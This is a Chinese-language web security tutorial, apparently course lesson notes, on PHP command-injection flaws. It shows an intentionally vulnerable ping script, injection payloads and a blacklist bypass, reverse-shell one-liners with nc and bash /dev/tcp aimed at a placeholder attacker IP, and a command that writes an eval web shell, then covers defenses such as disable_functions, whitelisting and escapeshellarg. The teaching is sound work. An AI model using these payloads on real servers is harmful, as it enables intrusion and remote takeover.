# 网络安全教程：P11：命令执行漏洞的利用与防护

![](img/7d184de72c6358ef5adcf3982ef88641_1.png)

![](img/7d184de72c6358ef5adcf3982ef88641_3.png)

![](img/7d184de72c6358ef5adcf3982ef88641_5.png)

![](img/7d184de72c6358ef5adcf3982ef88641_7.png)

![](img/7d184de72c6358ef5adcf3982ef88641_9.png)

![](img/7d184de72c6358ef5adcf3982ef88641_11.png)

![](img/7d184de72c6358ef5adcf3982ef88641_13.png)

![](img/7d184de72c6358ef5adcf3982ef88641_15.png)

![](img/7d184de72c6358ef5adcf3982ef88641_17.png)

![](img/7d184de72c6358ef5adcf3982ef88641_19.png)

![](img/7d184de72c6358ef5adcf3982ef88641_21.png)

## 概述
在本节课中，我们将学习命令执行漏洞的利用方法以及如何进行有效的防护。上节课我们介绍了命令执行漏洞的基本概念和原理，本节我们将深入探讨如何利用这些漏洞，并了解如何编写安全的代码来防御此类攻击。

![](img/7d184de72c6358ef5adcf3982ef88641_23.png)

![](img/7d184de72c6358ef5adcf3982ef88641_24.png)

![](img/7d184de72c6358ef5adcf3982ef88641_26.png)

![](img/7d184de72c6358ef5adcf3982ef88641_28.png)

![](img/7d184de72c6358ef5adcf3982ef88641_30.png)

![](img/7d184de72c6358ef5adcf3982ef88641_32.png)

![](img/7d184de72c6358ef5adcf3982ef88641_34.png)

## 命令执行漏洞回顾
上一节我们介绍了命令执行漏洞，其产生原因与SQL注入、XSS等漏洞类似，都是由于没有对用户输入进行严格的检查和过滤，导致用户输入被当作代码执行。

![](img/7d184de72c6358ef5adcf3982ef88641_36.png)

![](img/7d184de72c6358ef5adcf3982ef88641_38.png)

![](img/7d184de72c6358ef5adcf3982ef88641_40.png)

![](img/7d184de72c6358ef5adcf3982ef88641_42.png)

![](img/7d184de72c6358ef5adcf3982ef88641_44.png)

![](img/7d184de72c6358ef5adcf3982ef88641_46.png)

![](img/7d184de72c6358ef5adcf3982ef88641_48.png)

![](img/7d184de72c6358ef5adcf3982ef88641_50.png)

![](img/7d184de72c6358ef5adcf3982ef88641_52.png)

![](img/7d184de72c6358ef5adcf3982ef88641_54.png)

![](img/7d184de72c6358ef5adcf3982ef88641_55.png)

![](img/7d184de72c6358ef5adcf3982ef88641_57.png)

![](img/7d184de72c6358ef5adcf3982ef88641_59.png)

![](img/7d184de72c6358ef5adcf3982ef88641_61.png)

命令执行漏洞的危害与Web Shell类似，攻击者可以利用应用系统上的漏洞执行服务器命令，从而获取服务器的Shell权限。

![](img/7d184de72c6358ef5adcf3982ef88641_63.png)

![](img/7d184de72c6358ef5adcf3982ef88641_65.png)

![](img/7d184de72c6358ef5adcf3982ef88641_67.png)

![](img/7d184de72c6358ef5adcf3982ef88641_69.png)

![](img/7d184de72c6358ef5adcf3982ef88641_71.png)

![](img/7d184de72c6358ef5adcf3982ef88641_73.png)

![](img/7d184de72c6358ef5adcf3982ef88641_75.png)

![](img/7d184de72c6358ef5adcf3982ef88641_77.png)

命令执行主要分为两种类型：
1.  **远程代码执行**：漏洞存在于代码逻辑中，能够执行PHP代码。若想执行系统命令，仍需调用PHP中执行系统命令的函数。
2.  **远程命令执行**：应用系统本身存在调用系统命令的功能点，通常通过PHP调用系统命令的函数实现。如果未对用户输入进行严格过滤，极易导致命令执行漏洞。

![](img/7d184de72c6358ef5adcf3982ef88641_79.png)

在远程代码执行中，我们介绍了`eval`、`assert`等函数。在PHP命令执行中，常用的函数包括`exec()`、`system()`、`passthru()`和`shell_exec()`。

![](img/7d184de72c6358ef5adcf3982ef88641_81.png)

![](img/7d184de72c6358ef5adcf3982ef88641_83.png)

![](img/7d184de72c6358ef5adcf3982ef88641_85.png)

## 命令执行漏洞利用演示
我们将通过一个实例来演示如何利用命令执行漏洞。该实例是一个简单的网络工具，允许用户输入IP地址进行Ping测试。

![](img/7d184de72c6358ef5adcf3982ef88641_87.png)

![](img/7d184de72c6358ef5adcf3982ef88641_89.png)

![](img/7d184de72c6358ef5adcf3982ef88641_91.png)

![](img/7d184de72c6358ef5adcf3982ef88641_93.png)

![](img/7d184de72c6358ef5adcf3982ef88641_95.png)

![](img/7d184de72c6358ef5adcf3982ef88641_96.png)

![](img/7d184de72c6358ef5adcf3982ef88641_98.png)

### 漏洞代码分析
以下是存在漏洞的PHP代码核心部分：
```php
<?php
if(isset($_POST['submit']) && isset($_POST['ip'])){
    $ip = $_POST['ip'];
    if(stristr(php_uname('s'), 'Windows')){
        $cmd = shell_exec('ping '.$ip);
    } else {
        $cmd = shell_exec('ping -c 4 '.$ip);
    }
    echo "<pre>$cmd</pre>";
}
?>
```
这段代码的问题在于，它直接将用户输入的`$ip`变量拼接到系统命令中，没有进行任何过滤。

![](img/7d184de72c6358ef5adcf3982ef88641_100.png)

![](img/7d184de72c6358ef5adcf3982ef88641_102.png)

![](img/7d184de72c6358ef5adcf3982ef88641_104.png)

![](img/7d184de72c6358ef5adcf3982ef88641_106.png)

![](img/7d184de72c6358ef5adcf3982ef88641_107.png)

![](img/7d184de72c6358ef5adcf3982ef88641_109.png)

![](img/7d184de72c6358ef5adcf3982ef88641_111.png)

![](img/7d184de72c6358ef5adcf3982ef88641_112.png)

![](img/7d184de72c6358ef5adcf3982ef88641_114.png)

![](img/7d184de72c6358ef5adcf3982ef88641_116.png)

![](img/7d184de72c6358ef5adcf3982ef88641_118.png)

![](img/7d184de72c6358ef5adcf3982ef88641_119.png)

### 利用特殊字符执行命令
攻击者可以利用特殊的命令连接符，在正常的Ping命令后拼接并执行额外的系统命令。

![](img/7d184de72c6358ef5adcf3982ef88641_120.png)

![](img/7d184de72c6358ef5adcf3982ef88641_122.png)

![](img/7d184de72c6358ef5adcf3982ef88641_124.png)

![](img/7d184de72c6358ef5adcf3982ef88641_126.png)

![](img/7d184de72c6358ef5adcf3982ef88641_128.png)

![](img/7d184de72c6358ef5adcf3982ef88641_130.png)

![](img/7d184de72c6358ef5adcf3982ef88641_132.png)

![](img/7d184de72c6358ef5adcf3982ef88641_134.png)

![](img/7d184de72c6358ef5adcf3982ef88641_136.png)

![](img/7d184de72c6358ef5adcf3982ef88641_138.png)

以下是常用的命令连接符及其利用方式：

![](img/7d184de72c6358ef5adcf3982ef88641_140.png)

![](img/7d184de72c6358ef5adcf3982ef88641_142.png)

![](img/7d184de72c6358ef5adcf3982ef88641_144.png)

![](img/7d184de72c6358ef5adcf3982ef88641_146.png)

![](img/7d184de72c6358ef5adcf3982ef88641_148.png)

![](img/7d184de72c6358ef5adcf3982ef88641_150.png)

![](img/7d184de72c6358ef5adcf3982ef88641_152.png)

![](img/7d184de72c6358ef5adcf3982ef88641_154.png)

**管道符 `|`**
管道符会将前一个命令的输出作为后一个命令的输入。无论前一个命令是否执行成功，后一个命令都会执行。
```
127.0.0.1 | whoami
```
服务端实际执行的命令为：
```bash
ping 127.0.0.1 | whoami
```

![](img/7d184de72c6358ef5adcf3982ef88641_156.png)

![](img/7d184de72c6358ef5adcf3982ef88641_158.png)

![](img/7d184de72c6358ef5adcf3982ef88641_160.png)

![](img/7d184de72c6358ef5adcf3982ef88641_162.png)

![](img/7d184de72c6358ef5adcf3982ef88641_164.png)

![](img/7d184de72c6358ef5adcf3982ef88641_166.png)

![](img/7d184de72c6358ef5adcf3982ef88641_168.png)

**分号 `;` (Linux) 或 `&`、`&&`、`||` (Windows)**
这些符号用于顺序执行多个命令。
```
127.0.0.1; whoami
```

![](img/7d184de72c6358ef5adcf3982ef88641_170.png)

![](img/7d184de72c6358ef5adcf3982ef88641_172.png)

![](img/7d184de72c6358ef5adcf3982ef88641_174.png)

![](img/7d184de72c6358ef5adcf3982ef88641_176.png)

![](img/7d184de72c6358ef5adcf3982ef88641_178.png)

![](img/7d184de72c6358ef5adcf3982ef88641_180.png)

**反引号 `` ` ``**
反引号中的内容会被当作命令执行，并将其输出结果替换到原位置。
```
127.0.0.1 `whoami`
```

![](img/7d184de72c6358ef5adcf3982ef88641_182.png)

![](img/7d184de72c6358ef5adcf3982ef88641_184.png)

### 绕过简单的黑名单过滤
开发者可能会设置黑名单来过滤常见的命令连接符，但黑名单往往无法覆盖所有情况，容易被绕过。

![](img/7d184de72c6358ef5adcf3982ef88641_186.png)

![](img/7d184de72c6358ef5adcf3982ef88641_188.png)

![](img/7d184de72c6358ef5adcf3982ef88641_190.png)

![](img/7d184de72c6358ef5adcf3982ef88641_192.png)

![](img/7d184de72c6358ef5adcf3982ef88641_194.png)

![](img/7d184de72c6358ef5adcf3982ef88641_196.png)

![](img/7d184de72c6358ef5adcf3982ef88641_198.png)

![](img/7d184de72c6358ef5adcf3982ef88641_200.png)

假设黑名单过滤了`&`和`;`：
```php
$blacklist = array('&', ';');
$ip = str_replace($blacklist, '', $_POST['ip']);
```
攻击者可以使用未过滤的符号进行绕过，例如使用管道符`|`：
```
127.0.0.1 | whoami
```
或者，利用过滤规则本身进行构造。例如，提交`&;&`，过滤掉分号`;`后，剩下的`&&`依然可以连接命令。
```
127.0.0.1 &;& whoami
// 过滤后变为：127.0.0.1 && whoami
```

![](img/7d184de72c6358ef5adcf3982ef88641_202.png)

![](img/7d184de72c6358ef5adcf3982ef88641_204.png)

## 命令执行漏洞的深度利用
成功利用命令执行漏洞后，攻击者可以执行更多操作。

![](img/7d184de72c6358ef5adcf3982ef88641_206.png)

![](img/7d184de72c6358ef5adcf3982ef88641_208.png)

### 1. 反弹Shell
获取一个交互式的Shell会话，便于进一步控制。

![](img/7d184de72c6358ef5adcf3982ef88641_210.png)

![](img/7d184de72c6358ef5adcf3982ef88641_212.png)

![](img/7d184de72c6358ef5adcf3982ef88641_214.png)

![](img/7d184de72c6358ef5adcf3982ef88641_215.png)

![](img/7d184de72c6358ef5adcf3982ef88641_217.png)

![](img/7d184de72c6358ef5adcf3982ef88641_219.png)

![](img/7d184de72c6358ef5adcf3982ef88641_221.png)

![](img/7d184de72c6358ef5adcf3982ef88641_223.png)

**使用 `nc` (Netcat) 反弹Shell**
*   在攻击机监听端口：
    ```bash
    nc -lvp 4444
    ```
*   在存在漏洞的输入点执行（将`[ATTACKER_IP]`替换为攻击机IP）：
    ```
    127.0.0.1; nc [ATTACKER_IP] 4444 -e /bin/bash
    ```
    成功连接后，攻击机即可获得目标服务器的Shell。

![](img/7d184de72c6358ef5adcf3982ef88641_225.png)

![](img/7d184de72c6358ef5adcf3982ef88641_227.png)

![](img/7d184de72c6358ef5adcf3982ef88641_229.png)

![](img/7d184de72c6358ef5adcf3982ef88641_231.png)

![](img/7d184de72c6358ef5adcf3982ef88641_233.png)

![](img/7d184de72c6358ef5adcf3982ef88641_235.png)

**使用其他方法**
*   **Bash**：`bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1`
*   **Python/PHP/Perl**：这些语言也都有用于建立反向连接的单行命令。

![](img/7d184de72c6358ef5adcf3982ef88641_237.png)

![](img/7d184de72c6358ef5adcf3982ef88641_239.png)

![](img/7d184de72c6358ef5adcf3982ef88641_241.png)

![](img/7d184de72c6358ef5adcf3982ef88641_242.png)

![](img/7d184de72c6358ef5adcf3982ef88641_244.png)

![](img/7d184de72c6358ef5adcf3982ef88641_246.png)

![](img/7d184de72c6358ef5adcf3982ef88641_248.png)

### 2. 写入WebShell
直接通过命令执行写入一个PHP WebShell文件。
```
127.0.0.1; echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/shell.php
```
然后即可使用中国菜刀等工具连接`shell.php`。

![](img/7d184de72c6358ef5adcf3982ef88641_250.png)

![](img/7d184de72c6358ef5adcf3982ef88641_252.png)

![](img/7d184de72c6358ef5adcf3982ef88641_253.png)

![](img/7d184de72c6358ef5adcf3982ef88641_255.png)

![](img/7d184de72c6358ef5adcf3982ef88641_257.png)

![](img/7d184de72c6358ef5adcf3982ef88641_259.png)

![](img/7d184de72c6358ef5adcf3982ef88641_261.png)

### 3. 绕过过滤写Shell
如果黑名单过滤了分号`;`和引号`'`，可以尝试以下方式：
*   使用其他连接符，如`|`、`||`、`&&`。
*   使用编码或变量拼接绕过对引号的过滤。
    ```php
    // 原语句：echo '<?php eval($_GET[a]);?>';
    // 绕过方式：
    echo <?php eval(\$_GET[a]);?>; // 利用PHP短标签和变量
    ```

![](img/7d184de72c6358ef5adcf3982ef88641_263.png)

![](img/7d184de72c6358ef5adcf3982ef88641_265.png)

![](img/7d184de72c6358ef5adcf3982ef88641_267.png)

![](img/7d184de72c6358ef5adcf3982ef88641_269.png)

![](img/7d184de72c6358ef5adcf3982ef88641_271.png)

![](img/7d184de72c6358ef5adcf3982ef88641_273.png)

![](img/7d184de72c6358ef5adcf3982ef88641_275.png)

![](img/7d184de72c6358ef5adcf3982ef88641_277.png)

![](img/7d184de72c6358ef5adcf3982ef88641_279.png)

## 命令执行漏洞的防护
了解了利用方式后，我们来看看如何有效防护命令执行漏洞。

![](img/7d184de72c6358ef5adcf3982ef88641_281.png)

![](img/7d184de72c6358ef5adcf3982ef88641_283.png)

![](img/7d184de72c6358ef5adcf3982ef88641_285.png)

![](img/7d184de72c6358ef5adcf3982ef88641_287.png)

![](img/7d184de72c6358ef5adcf3982ef88641_289.png)

![](img/7d184de72c6358ef5adcf3982ef88641_291.png)

![](img/7d184de72c6358ef5adcf3982ef88641_293.png)

### 1. 禁用高危函数
在PHP配置文件`php.ini`中，通过`disable_functions`选项禁用不必要的危险函数。
```
disable_functions = exec,system,passthru,shell_exec,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,eval,assert
```
这能从根本上防止许多代码执行和命令执行函数被利用。

![](img/7d184de72c6358ef5adcf3982ef88641_295.png)

![](img/7d184de72c6358ef5adcf3982ef88641_297.png)

### 2. 严格过滤输入
对用户输入进行严格的验证和过滤。
*   **使用白名单**：只允许符合特定格式的输入（如IP地址只允许数字和点）。
    ```php
    if(preg_match('/^[0-9.]+$/', $ip)) {
        // 执行命令
    } else {
        die('Invalid input');
    }
    ```
*   **转义特殊字符**：使用`escapeshellarg()`或`escapeshellcmd()`函数对命令参数进行转义。
    ```php
    $ip = escapeshellarg($_POST['ip']);
    $cmd = 'ping -c 4 ' . $ip;
    ```

### 3. 避免直接拼接命令
尽量不要将用户输入直接拼接到系统命令中。如果必须这样做，请使用上述过滤和转义方法。

### 4. 使用更安全的替代方案
如果功能是调用系统命令，考虑是否有更安全的PHP内置函数可以替代。例如，检查主机存活可以使用`fsockopen()`而不是`ping`命令。

### 5. 配置服务器环境
*   以低权限用户（如`www-data`）运行Web服务，并设置适当的文件系统权限。
*   开启PHP的`open_basedir`限制，将PHP可访问的文件限制在特定目录树中。

![](img/7d184de72c6358ef5adcf3982ef88641_299.png)

## 总结
本节课我们一起学习了命令执行漏洞的利用与防护。我们通过实例分析了漏洞产生的原因，演示了如何利用特殊字符拼接执行系统命令，并探讨了反弹Shell、写入WebShell等深度利用方法。最后，我们重点介绍了多种防护策略，包括禁用高危函数、严格输入验证、转义特殊字符以及配置安全的服务器环境。理解这些攻击和防御技术，对于构建安全的Web应用至关重要。